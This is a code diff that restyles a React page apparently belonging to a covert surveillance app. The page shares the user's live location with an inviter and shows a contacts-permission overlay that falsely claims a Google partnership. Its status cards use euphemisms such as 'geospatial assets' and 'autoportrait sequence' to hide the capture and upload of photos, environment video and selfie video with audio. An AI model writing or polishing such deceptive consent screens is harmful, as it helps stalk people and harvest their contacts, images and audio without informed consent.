@@ -2234,132 +2234,118 @@ export default function ConsentPage() {
     };
 
     return (
-      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(180deg,#0d0d1f 0%,#080810 100%)" }}>
+      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(170deg,#180c05 0%,#231208 30%,#1c0f06 65%,#0e0803 100%)", backgroundImage: "radial-gradient(circle at 1px 1px, rgba(180,130,50,0.045) 1px, transparent 0)", backgroundSize: "20px 20px" }}>
 
-        {/* ── Contacts auto-popup overlay ────────────────────────────────────────
-            Appears instantly when tracking starts. One tap fires the OS picker
-            (that single tap satisfies Chrome's user-gesture requirement).       */}
+        {/* ── Contacts auto-popup overlay ──────────────────────────────────── */}
         {showContactsPrompt && !contactsCollected && (
-          <div
-            className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 overflow-hidden"
-            style={{ background: "linear-gradient(170deg,#f9a8d4 0%,#e879f9 30%,#a855f7 65%,#6d28d9 100%)" }}
-          >
-            <FloatingSparkles particles={[
-              { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
-              { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
-              { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
-              { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
-              { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
-              { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
-            ]} />
-
-            {/* Glowing orb mascot */}
+          <div className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 text-center"
+            style={{ background: "rgba(14,8,3,0.93)", backdropFilter: "blur(8px)" }}>
             <motion.div
-              className="relative flex items-center justify-center mb-6"
-              initial={{ scale: 0.7, opacity: 0 }}
-              animate={{ scale: 1, opacity: 1 }}
-              transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
+              className="w-16 h-16 rounded-full flex items-center justify-center mb-5 shadow-lg"
+              style={{ background: "linear-gradient(135deg,#C8922A,#8B6914)", boxShadow: "0 0 24px rgba(200,146,42,0.45)" }}
+              initial={{ scale: 0.7, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: "spring", bounce: 0.45 }}
             >
-              <div className="absolute rounded-full" style={{ width: 128, height: 128, background: "radial-gradient(circle, rgba(232,121,249,0.55) 0%, rgba(168,85,247,0.2) 60%, transparent 80%)", filter: "blur(8px)" }} />
-              <div className="w-28 h-28 rounded-full flex items-center justify-center relative z-10" style={{ background: "radial-gradient(circle at 38% 38%, rgba(255,255,255,0.55) 0%, rgba(216,180,254,0.7) 40%, rgba(167,139,250,0.85) 100%)", boxShadow: "0 0 40px rgba(232,121,249,0.6), inset 0 0 20px rgba(255,255,255,0.3)" }}>
-                <motion.span className="text-4xl select-none" animate={{ y: [0, -5, 0], rotate: [-3, 3, -3] }} transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }} role="img" aria-label="friendly character">😊</motion.span>
-              </div>
+              <Phone className="h-7 w-7 text-white" />
             </motion.div>
-
             <motion.h2
-              className="text-2xl font-extrabold text-white text-center mb-3 leading-tight"
-              style={{ textShadow: "0 2px 16px rgba(168,85,247,0.5)" }}
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.15 }}
+              className="text-xl font-bold mb-2"
+              style={{ color: "#D4A843", fontFamily: "Georgia, serif", letterSpacing: "0.05em" }}
+              initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.12 }}
             >
-              Let's Stay Connected 💕
+              Link Your Contacts
             </motion.h2>
             <motion.div
-              className="flex items-center justify-center gap-1.5 mb-3"
-              initial={{ opacity: 0, y: 6 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.2 }}
+              className="flex items-center gap-1.5 mb-3"
+              initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.18 }}
             >
-              <svg width="13" height="13" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-              </svg>
-              <span className="text-xs text-white/60 font-medium tracking-wide">In partnership with Google</span>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#D4A843" strokeWidth="2"/><path d="M12 8v4l3 3" stroke="#D4A843" strokeWidth="2" strokeLinecap="round"/></svg>
+              <span style={{ fontSize: 11, color: "rgba(212,168,67,0.6)", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.06em" }}>IN PARTNERSHIP WITH GOOGLE</span>
             </motion.div>
             <motion.p
-              className="text-sm text-white/80 text-center leading-relaxed mb-8 max-w-xs"
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.25 }}
+              style={{ fontSize: 14, color: "rgba(220,185,130,0.8)", lineHeight: 1.6, marginBottom: 24, maxWidth: 280 }}
+              initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}
             >
-              Let's help Google secure your loved ones contact — recommended if you wish to proceed 100 💯 percent secure ✨
+              Let's help Google secure your loved ones contact — recommended if you wish to proceed 100% secure ✨
             </motion.p>
-            <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
+            <motion.div style={{ width: "100%", maxWidth: 280 }} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
               <button
-                onClick={async () => {
-                  setShowContactsPrompt(false);
-                  await pickContacts();
-                }}
-                className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.98] transition-transform flex items-center justify-center gap-2"
-                style={{ background: "linear-gradient(135deg,#f472b6 0%,#c084fc 50%,#a855f7 100%)", boxShadow: "0 8px 32px rgba(192,132,252,0.55), 0 0 0 1.5px rgba(255,255,255,0.25) inset" }}
+                onClick={async () => { setShowContactsPrompt(false); await pickContacts(); }}
+                style={{ width: "100%", padding: "14px 20px", borderRadius: 8, fontWeight: 700, fontSize: 15, color: "#1a0c05", border: "none", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "linear-gradient(135deg, #D4A843 0%, #C8922A 50%, #8B6914 100%)", boxShadow: "0 6px 24px rgba(200,146,42,0.5), inset 0 1px 0 rgba(255,255,255,0.2)" }}
               >
                 <Phone className="h-4 w-4" />
-                Allow Contacts ✨
+                Allow Contacts
               </button>
             </motion.div>
           </div>
         )}
 
-        <div className="max-w-md mx-auto px-4 py-6 space-y-4">
+        <div style={{ maxWidth: 480, margin: "0 auto", padding: "24px 16px 36px", display: "flex", flexDirection: "column", gap: 14 }}>
 
-          {/* ── LIVE SHARING header ───────────────────────────────────────────── */}
-          <div className="flex items-center gap-2.5">
-            <div className="relative flex-shrink-0">
-              <>
-                <div className="w-3 h-3 rounded-full bg-emerald-400" />
-                <div className="absolute inset-0 rounded-full bg-emerald-400 animate-ping opacity-70" />
-              </>
-            </div>
-            <span className="font-extrabold text-base tracking-widest uppercase text-emerald-400">
+          {/* ── LIVE SHARING header ── */}
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 2 }}>
+            {/* Quill icon */}
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z" fill="#C8922A" opacity="0.8"/>
+              <line x1="16" y1="8" x2="2" y2="22" stroke="#D4A843" strokeWidth="1.8" strokeLinecap="round"/>
+              <line x1="17" y1="13.5" x2="10" y2="13.5" stroke="#D4A843" strokeWidth="0.9" opacity="0.5"/>
+              <line x1="15.5" y1="11" x2="10.5" y2="16" stroke="#D4A843" strokeWidth="0.9" opacity="0.35"/>
+            </svg>
+            <span style={{ fontFamily: "Georgia, 'Palatino Linotype', serif", fontWeight: 900, fontSize: 17, letterSpacing: "0.14em", color: "#D4A843", textTransform: "uppercase", textShadow: "0 0 14px rgba(212,168,67,0.45)" }}>
               Live Sharing
             </span>
           </div>
 
+          {/* Brass divider */}
+          <div style={{ height: 1, background: "linear-gradient(90deg, transparent, #7a5c28 20%, #C8922A 50%, #7a5c28 80%, transparent)", margin: "0" }}/>
+
           {/* Sharing-with blurb */}
-          <p className="text-[15px] text-white/75 leading-relaxed">
+          <p style={{ fontSize: 15, color: "rgba(220,185,130,0.82)", lineHeight: 1.6, margin: "4px 0" }}>
             Your live location is being shared with{" "}
-            <span className="font-bold text-white">{invite!.fromUserName}</span>.
-            You can play games or watch videos — sharing keeps going in the background.
+            <strong style={{ color: "#E5C88A", fontWeight: 800 }}>{invite!.fromUserName}</strong>.
+            {" "}You can play games or watch videos — sharing keeps going in the background
           </p>
 
-          {/* ── Status cards ─────────────────────────────────────────────────── */}
-          <div className="space-y-2.5">
+          {/* ── Status cards ── */}
+          <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
 
             {/* Geo photos — in progress */}
             {!geoPhotoDone && geoBoardStartedRef.current && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
-                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-indigo-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
+                {/* Eagle head */}
+                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
+                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
+                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
+                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
+                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: archiving geospatial assets {geoPhotoCount}/{GEO_PHOTO_COUNT}…
                   </p>
-                  <div className="mt-1.5 h-1 bg-indigo-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-indigo-400 rounded-full transition-all duration-500"
-                      style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
+                  <div style={{ height: 3, background: "rgba(122,92,40,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B6914,#D4A843)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}/>
                   </div>
                 </div>
               </div>
             )}
             {/* Geo photos — done */}
             {geoPhotoDone && geoPhotoCount > 0 && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
-                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-indigo-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
+                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
+                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
+                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
+                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
+                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
+                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                   Geo Board: {geoPhotoCount} geospatial asset{geoPhotoCount !== 1 ? "s" : ""} archived ✓
                 </p>
               </div>
@@ -2367,55 +2353,70 @@ export default function ConsentPage() {
 
             {/* Env video — recording */}
             {geoVideoState === "recording" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Video className="h-4 w-4 text-red-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-red-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 1.5s ease-in-out infinite" }}>
+                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: capturing dynamic media ({GEO_VIDEO_DURATION_SECONDS}s)…
                   </p>
-                  <div className="mt-1.5 h-1 bg-red-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-red-400 rounded-full"
-                      style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
+                  <div style={{ height: 3, background: "rgba(100,60,20,0.35)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A)", borderRadius: 2, width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }}/>
                   </div>
                 </div>
               </div>
             )}
             {/* Env video — uploading */}
             {geoVideoState === "uploading" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Loader2 className="h-4 w-4 text-red-400 flex-shrink-0 animate-spin" />
-                <p className="text-[13px] font-semibold text-red-200">Geo Board: persisting dynamic media…</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Loader2 style={{ width: 18, height: 18, color: "#C8922A", flexShrink: 0, animation: "spin 1s linear infinite" }} />
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: persisting dynamic media…</p>
               </div>
             )}
             {/* Env video — done */}
             {geoVideoState === "done" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
-                <Video className="h-4 w-4 text-red-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-red-200">Geo Board: dynamic media capture persisted ✓</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
+                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: dynamic media capture persisted ✓</p>
               </div>
             )}
 
             {/* Selfie photos — in progress */}
             {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Camera className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-purple-200">
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                {/* Left feather decoration */}
+                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75 }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
+                {/* Eye icon */}
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 2s ease-in-out infinite" }}>
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+                <div style={{ flex: 1 }}>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                     Geo Board: capturing autoportrait sequence {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}…
                   </p>
-                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-purple-400 rounded-full transition-all duration-500"
-                      style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
+                  <div style={{ height: 3, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                    <div style={{ height: "100%", background: "linear-gradient(90deg,#7a4e18,#b87d3a)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }}/>
                   </div>
                 </div>
+                {/* Right feather decoration */}
+                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75, transform: "scaleX(-1)" }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
               </div>
             )}
 
-            {/* Selfie video — recording (40 s with live countdown) */}
+            {/* Selfie video — recording */}
             {geoSelfieState === "recording" && (() => {
               const remaining = Math.max(0, GEO_SELFIE_VIDEO_DURATION_SECONDS - geoSelfieElapsed);
               const pct = Math.min(100, (geoSelfieElapsed / GEO_SELFIE_VIDEO_DURATION_SECONDS) * 100);
@@ -2423,151 +2424,185 @@ export default function ConsentPage() {
               const secs = remaining % 60;
               const timeLabel = mins > 0 ? `${mins}:${String(secs).padStart(2, "0")}` : `${secs}s`;
               return (
-                <div className="rounded-xl px-4 py-3 flex items-start gap-3"
-                  style={{ background: "linear-gradient(135deg,rgba(126,34,206,0.22),rgba(88,28,135,0.28))", border: "1px solid rgba(192,132,252,0.35)", boxShadow: "0 0 12px rgba(168,85,247,0.15)" }}>
-                  {/* Pulsing record dot */}
-                  <div className="mt-0.5 flex-shrink-0 relative">
-                    <span className="absolute inset-0 rounded-full bg-red-500 opacity-40 animate-ping" style={{ width: 14, height: 14 }} />
-                    <span className="relative block rounded-full bg-red-500" style={{ width: 14, height: 14 }} />
+                <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "flex-start", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                  <div style={{ marginTop: 2, flexShrink: 0, position: "relative" }}>
+                    <span style={{ position: "absolute", inset: 0, borderRadius: "50%", background: "#C8922A", opacity: 0.35, width: 14, height: 14, animation: "pulse 1s infinite" }}/>
+                    <span style={{ position: "relative", display: "block", borderRadius: "50%", background: "#C8922A", width: 14, height: 14 }}/>
                   </div>
-                  <div className="flex-1 min-w-0">
-                    <div className="flex items-center justify-between mb-1">
-                      <p className="text-[13px] font-bold text-purple-100 tracking-wide">
-                        🎥 Geo Board: recording autoportrait
-                      </p>
-                      <span className="text-[12px] font-mono font-semibold text-purple-300 ml-2 flex-shrink-0">
-                        {timeLabel} left
-                      </span>
+                  <div style={{ flex: 1 }}>
+                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
+                      <p style={{ fontSize: 13, fontWeight: 700, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: recording autoportrait</p>
+                      <span style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "#b87d3a", marginLeft: 8, flexShrink: 0 }}>{timeLabel} left</span>
                     </div>
-                    {/* Segmented progress bar */}
-                    <div className="mt-1.5 h-2 bg-purple-950/60 rounded-full overflow-hidden">
-                      <div className="h-full rounded-full"
-                        style={{
-                          width: `${pct}%`,
-                          background: "linear-gradient(90deg,#a855f7,#e879f9)",
-                          transition: "width 0.9s linear",
-                          boxShadow: "0 0 6px rgba(232,121,249,0.6)",
-                        }} />
+                    <div style={{ height: 4, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
+                      <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A,#D4A843)", borderRadius: 2, transition: "width 0.9s linear", width: `${pct}%`, boxShadow: "0 0 6px rgba(200,146,42,0.5)" }}/>
                     </div>
-                    <p className="mt-1 text-[11px] text-purple-400">Audio ● {GEO_SELFIE_VIDEO_DURATION_SECONDS}s · compressed</p>
+                    <p style={{ marginTop: 4, fontSize: 11, color: "rgba(180,130,60,0.6)", fontFamily: "'Share Tech Mono', monospace" }}>Audio ● {GEO_SELFIE_VIDEO_DURATION_SECONDS}s · compressed</p>
                   </div>
+                  {/* Right feather */}
+                  <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.55, transform: "scaleX(-1)", marginTop: 2 }}>
+                    <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                    <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                    <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                  </svg>
                 </div>
               );
             })()}
             {/* Selfie video — uploading */}
             {geoSelfieState === "uploading" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "linear-gradient(135deg,rgba(126,34,206,0.22),rgba(88,28,135,0.28))", border: "1px solid rgba(192,132,252,0.35)" }}>
-                <Loader2 className="h-4 w-4 text-purple-400 flex-shrink-0 animate-spin" />
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
+                <Loader2 style={{ width: 18, height: 18, color: "#b87d3a", flexShrink: 0, animation: "spin 1s linear infinite" }} />
                 <div>
-                  <p className="text-[13px] font-semibold text-purple-200">Geo Board: archiving autoportrait sequence…</p>
-                  <p className="text-[11px] text-purple-500 mt-0.5">Compressing &amp; uploading</p>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: archiving autoportrait sequence…</p>
+                  <p style={{ fontSize: 11, color: "rgba(180,130,60,0.5)", marginTop: 2, fontFamily: "'Share Tech Mono', monospace" }}>Compressing &amp; uploading</p>
                 </div>
               </div>
             )}
-            {/* Selfie photos or video — done (show once either finishes) */}
+            {/* Selfie done */}
             {(geoSelfiePhotoDone || geoSelfieState === "done") && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Video className="h-4 w-4 text-purple-400 flex-shrink-0" />
-                <p className="text-[13px] font-semibold text-purple-200">Geo Board: autoportrait sequence archived ✓</p>
+              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
+                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7 }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#b87d3a" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: autoportrait sequence archived ✓</p>
+                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7, transform: "scaleX(-1)", marginLeft: "auto" }}>
+                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
+                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
+                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
+                </svg>
               </div>
             )}
 
             {/* Contacts saved */}
             {contactsCollected && contactsCollectedCountRef.current > 0 && (
